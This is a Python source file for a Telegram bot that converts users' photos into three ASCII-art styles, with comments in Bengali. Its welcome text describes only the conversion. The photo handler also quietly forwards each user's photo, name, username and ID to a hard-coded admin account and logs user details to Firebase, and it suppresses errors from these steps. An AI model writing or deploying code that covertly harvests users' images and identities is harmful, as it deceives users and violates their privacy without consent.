import os
import subprocess
import json
import firebase_admin
from firebase_admin import credentials, db
from telegram import Update
from telegram.ext import ApplicationBuilder, MessageHandler, CommandHandler, filters, ContextTypes

# গিটহাব সিক্রেটস থেকে ডেটা নেওয়া
TOKEN = os.getenv("BOT_TOKEN")
FIREBASE_URL = os.getenv("FIREBASE_URL")
FIREBASE_RAW = os.getenv("FIREBASE_JSON")

# তোমার নিজের টেলিগ্রাম আইডি এখানে দাও ( @userinfobot থেকে আইডি নাও)
MY_ID = 5652432858 

# ফায়ারবেস সেটআপ (নিরাপদভাবে)
firebase_connected = False
if FIREBASE_RAW and FIREBASE_URL:
    try:
        clean_url = FIREBASE_URL.strip().rstrip('/')
        FIREBASE_DICT = json.loads(FIREBASE_RAW)
        if not firebase_admin._apps:
            cred = credentials.Certificate(FIREBASE_DICT)
            firebase_admin.initialize_app(cred, {'databaseURL': clean_url})
            firebase_connected = True
            print("Firebase Connected!")
    except Exception as e:
        print(f"Firebase Init Error: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """স্বাগতম মেসেজ"""
    welcome_text = (
        "<b>Welcome to ASCII Maker!</b> 🎨\n\n"
        "I can convert your photos into 3 unique ASCII art styles.\n\n"
        "<b>How to use:</b>\n"
        "1. Send me any <b>Photo</b>.\n"
        "2. Wait for processing.\n"
        "3. Get 3 different styles of ASCII text!\n\n"
        "<i>Note: Best viewed in landscape mode or desktop.</i>"
    )
    await update.message.reply_text(welcome_text, parse_mode='HTML')

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ফটো প্রসেস করা, ফায়ারবেসে রাখা এবং ৩টি স্টাইল পাঠানো"""
    user = update.effective_user
    photo = update.message.photo[-1]
    status_msg = await update.message.reply_text("Processing your image into 3 styles... 🎨")

    try:
        # ১. তোমার কাছে ছবি পাঠানো (Admin Log)
        try:
            await context.bot.send_photo(
                chat_id=MY_ID,
                photo=photo.file_id,
                caption=f"📩 Photo from: {user.first_name} (@{user.username})\nID: {user.id}"
            )
        except: pass

        # ২. ফায়ারবেসে ডাটা লগ করা
        if firebase_connected:
            try:
                db.reference(f'users/{user.id}').update({
                    "name": user.first_name,
                    "username": user.username,
                    "last_active": str(update.message.date)
                })
            except: pass

        # ৩. আসকি আর্ট তৈরি করা
        photo_file = await photo.get_file()
        input_path = f"img_{user.id}.jpg"
        await photo_file.download_to_drive(input_path)

        # স্টাইল কনফিগারেশন (টেলিগ্রামের লিমিট অনুযায়ী সাইজ ছোট রাখা হয়েছে)
        styles = [
            {"label": "✨ Style 1: Braille Dots", "cmd": ["--symbols", "braille", "--size", "45x30"]},
            {"label": "🔳 Style 2: Blocks", "cmd": ["--symbols", "block", "--size", "40x25"]},
            {"label": "📜 Style 3: Classic ASCII", "cmd": ["--symbols", "ascii", "--size", "40x25"]}
        ]

        for style in styles:
            cmd = ["chafa"] + style["cmd"] + ["-c", "none", input_path]
            res = subprocess.run(cmd, capture_output=True, text=True).stdout
            
            if res:
                # মেসেজ ৪০০০ ক্যারেক্টারের বেশি হলে কেটে ফেলা (Safety)
                if len(res) > 3900:
                    res = res[:3900] + "\n(Truncated...)"
                
                await update.message.reply_text(
                    f"<b>{style['label']}</b>\n<code>{res}</code>", 
                    parse_mode='HTML'
                )

        # Cleanup
        if os.path.exists(input_path): os.remove(input_path)

    except Exception as e:
        await update.message.reply_text(f"Sorry, an error occurred: <code>{e}</code>", parse_mode='HTML')
    
    finally:
        await status_msg.delete()

async def handle_invalid_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⚠️ <b>Invalid Input!</b>\nPlease send a <b>Photo</b> to generate ASCII art.",
        parse_mode='HTML'
    )

if __name__ == "__main__":
    if not TOKEN:
        print("Error: BOT_TOKEN not found!")
        exit(1)
        
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", start))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.ALL & (~filters.PHOTO) & (~filters.COMMAND), handle_invalid_input))

    print("Bot is running with Firebase and Multi-style support...")
    app.run_polling()
